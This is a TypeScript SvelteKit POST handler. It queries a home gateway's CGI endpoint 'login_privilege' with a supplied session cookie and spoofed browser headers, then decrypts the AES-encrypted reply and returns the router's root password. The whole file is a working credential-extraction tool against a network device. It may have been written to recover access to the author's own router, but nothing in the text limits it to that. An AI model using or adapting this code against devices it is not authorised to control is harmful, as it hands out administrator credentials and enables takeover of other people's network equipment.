// eslint-disable-next-line @typescript-eslint/no-unused-vars
import { json } from '@sveltejs/kit';
import * as crypto from 'crypto';

export async function POST({ request }) {
	try {
		const reqObj = await request.json();
		const sessionKey = reqObj['sessionKey'];
		const gatewayIPv4 = reqObj['gatewayIPv4'];
		const aesKey = reqObj['aesKey'];
		const cookies = `Session=${sessionKey}; SameSite=None; Secure;`;
		const response = await fetch(`http://${gatewayIPv4}/cgi-bin/DAL?oid=login_privilege`, {
			credentials: 'include',
			method: 'GET',
			mode: 'cors',
			headers: {
				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
				Accept: 'application/json,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				Referer: gatewayIPv4,
				cookie: cookies,
				Host: gatewayIPv4,
				'X-Requested-With': 'XMLHttpRequest'
			}
		});
		const resObj = await response.json();
		const content = Buffer.from(resObj['content'], 'base64');
		const iv = resObj['iv'];
		const key = Buffer.from(aesKey, 'base64');

		const newResObj = decrypt(Buffer.from(content), 'aes-256-cbc', key, iv).toString('ascii');

		let foundObject = false;

		let counter = 0;
		while (!foundObject) {
			if (newResObj.slice(counter, counter + 6) === 'Object') {
				foundObject = true;
			} else {
				counter++;
			}
		}

		const newResJson = JSON.parse(newResObj.slice(counter + 8, -1));
		let rootPassword: string = '';
		newResJson.forEach((e: never) => {
			if (e['Username'] === 'root') {
				rootPassword = e['Password'];
			}
		});

		return new Response(JSON.stringify({ rootPassword }));
	} catch (error) {
		return new Response(JSON.stringify({ error }), { status: 500 });
	}
}

function decrypt(buffer: Buffer, algorithm: string, key: Buffer, iv: string) {
	const decipher = crypto.createDecipheriv(algorithm, key, iv.slice(0, 16));
	return Buffer.concat([decipher.update(buffer), decipher.final()]);
}
